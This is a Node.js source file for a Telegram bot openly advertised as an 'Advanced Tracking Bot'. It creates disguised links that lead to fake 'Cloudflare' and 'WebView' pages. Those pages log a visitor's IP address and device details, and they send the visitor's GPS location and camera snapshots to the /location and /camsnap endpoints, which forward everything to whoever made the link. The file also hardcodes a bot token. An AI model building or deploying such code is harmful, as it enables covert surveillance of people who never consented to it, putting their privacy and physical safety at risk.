const fs = require("fs");
const express = require("express");
var bodyParser = require("body-parser");
const TelegramBot = require("node-telegram-bot-api");

// --- CONFIGURATION ---
const TOKEN = "8779470611:AAE6MnR-n0jOsvDKGBvV9aHqeyPXNzZeteI"
const CHANNEL_ID = "@Digiwordls"; // ඔබේ Channel Username එක මෙතනට දාන්න (@ සමඟ)
const CHANNEL_URL = "https://t.me/Digiwordls"; // ඔබේ Channel Link එක මෙතනට දාන්න
const hostURL = "https://google-co-file.onrender.com";

const bot = new TelegramBot(TOKEN, { polling: true });
const app = express();

app.use(bodyParser.json({ limit: "20mb" }));
app.use(bodyParser.urlencoded({ extended: true, limit: "20mb" }));
app.set("view engine", "ejs");

// =========================
// SUBSCRIPTION CHECK FUNCTION
// =========================
async function checkSubscription(chatId) {
  try {
    const member = await bot.getChatMember(CHANNEL_ID, chatId);
    const status = member.status;
    // member, administrator, හෝ creator නම් පමණක් true ලබා දෙයි
    return status === "member" || status === "administrator" || status === "creator";
  } catch (error) {
    console.error("Subscription Error:", error);
    return false;
  }
}

// =========================
// START MENU
// =========================
function sendStartMenu(chatId, firstName = "User") {
  var menu = {
    reply_markup: JSON.stringify({
      inline_keyboard: [
        [{ text: "🌐 Create Link", callback_data: "crenew" }],
        [{ text: "📖 Help", callback_data: "help" }],
        [{ text: "ℹ️ About", callback_data: "about" }],
      ],
    }),
  };

  // logo.png ගොනුව තිබේ නම් පමණක් මෙය ක්‍රියා කරයි
  if (fs.existsSync("./logo.png")) {
    bot.sendPhoto(chatId, fs.createReadStream("./logo.png"), {
      caption: `🔥 Welcome ${firstName}!\n\n⚡ Advanced Tracking Bot\n\n━━━━━━━━━━━━━━\n✅ Features\n• Create custom links\n• Device information\n• IP logging\n• Camera capture\n• Location tracking\n━━━━━━━━━━━━━━\n\n👇 Select an option below`,
      parse_mode: "HTML",
    }, menu);
  } else {
    bot.sendMessage(chatId, `🔥 Welcome ${firstName}!\n\nSelect an option:`, menu);
  }
}

// =========================
// BOT MESSAGES
// =========================
bot.on("message", async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;

  // Verify / Start check
  if (text === "/start") {
    const isSubscribed = await checkSubscription(chatId);

    if (!isSubscribed) {
      return bot.sendMessage(chatId, 
        `👋 <b>Welcome!</b>\n\nYou must join our channel to use this bot.`, 
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "📢 Join Channel", url: CHANNEL_URL }],
              [{ text: "✅ Verify / Start", callback_data: "verify_join" }]
            ]
          }
        }
      );
    }
    sendStartMenu(chatId, msg.chat.first_name);
    return;
  }

  // අනිත් Commands සඳහා join වී ඇත්දැයි බැලීම
  const isSubscribed = await checkSubscription(chatId);
  if (!isSubscribed) {
    return bot.sendMessage(chatId, "⚠️ Please join our channel first to use commands!");
  }

  if (msg?.reply_to_message?.text == "🌐 Enter Your ANY URL") {
    createLink(chatId, text);
  } else if (text == "/create") {
    createNew(chatId);
  } else if (text == "/help") {
    bot.sendMessage(chatId, `📖 <b>HOW TO USE</b>\n\n1️⃣ Send /create\n2️⃣ Enter your target URL\n3️⃣ Bot will generate links\n\n⚡ <b>FEATURES</b>\n• IP Logging\n• Device Info\n• Camera Capture`, { parse_mode: "HTML" });
  }
});

// =========================
// CALLBACK BUTTONS
// =========================
bot.on("callback_query", async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;

  if (data === "verify_join") {
    const isSubscribed = await checkSubscription(chatId);
    if (isSubscribed) {
      bot.answerCallbackQuery(callbackQuery.id, { text: "✅ Success!" });
      bot.deleteMessage(chatId, callbackQuery.message.message_id);
      sendStartMenu(chatId, callbackQuery.from.first_name);
    } else {
      bot.answerCallbackQuery(callbackQuery.id, { text: "❌ You haven't joined yet!", show_alert: true });
    }
    return;
  }

  // අනෙකුත් buttons සඳහා join check එක
  const isSubscribed = await checkSubscription(chatId);
  if (!isSubscribed) {
    return bot.answerCallbackQuery(callbackQuery.id, { text: "⚠️ Join channel first!", show_alert: true });
  }

  bot.answerCallbackQuery(callbackQuery.id);
  if (data == "crenew") createNew(chatId);
  if (data == "help") bot.sendMessage(chatId, "Send /create to generate links.");
  if (data == "about") bot.sendMessage(chatId, "Advanced Tracking Bot v2.0");
});

// =========================
// FUNCTIONS
// =========================
function createLink(cid, msg) {
  var encoded = [...msg].some((char) => char.charCodeAt(0) > 127);
  if ((msg.toLowerCase().includes("http")) && !encoded) {
    var url = cid.toString(36) + "/" + btoa(msg);
    bot.sendMessage(cid, `✅ Links Created:\n\n🌐 CloudFlare:\n${hostURL}/c/${url}\n\n🌐 WebView:\n${hostURL}/w/${url}`);
  } else {
    bot.sendMessage(cid, `⚠️ Invalid URL.`);
    createNew(cid);
  }
}

function createNew(cid) {
  bot.sendMessage(cid, `🌐 Enter Your ANY URL`, { reply_markup: { force_reply: true } });
}

// =========================
// ROUTES (Express)
// =========================
app.get("/w/:path/:uri", (req, res) => {
  let ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.ip;
  res.render("webview", { ip, time: new Date().toISOString(), url: atob(req.params.uri), uid: req.params.path });
});

app.get("/c/:path/:uri", (req, res) => {
  let ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.ip;
  res.render("cloudflare", { ip, time: new Date().toISOString(), url: atob(req.params.uri), uid: req.params.path });
});

app.post("/location", (req, res) => {
  const { lat, lon, uid, acc } = req.body;
  if (lat && lon && uid) {
    bot.sendLocation(parseInt(uid, 36), lat, lon);
    bot.sendMessage(parseInt(uid, 36), `📍 Location Received\nAcc: ${acc}m`);
  }
  res.send("Done");
});

app.post("/camsnap", (req, res) => {
  const { uid, img } = req.body;
  if (uid && img) {
    bot.sendPhoto(parseInt(uid, 36), Buffer.from(img, "base64"), {}, { filename: "snap.png", contentType: "image/png" });
  }
  res.send("Done");
});

app.listen(5000, () => console.log("✅ Server started on port 5000"));
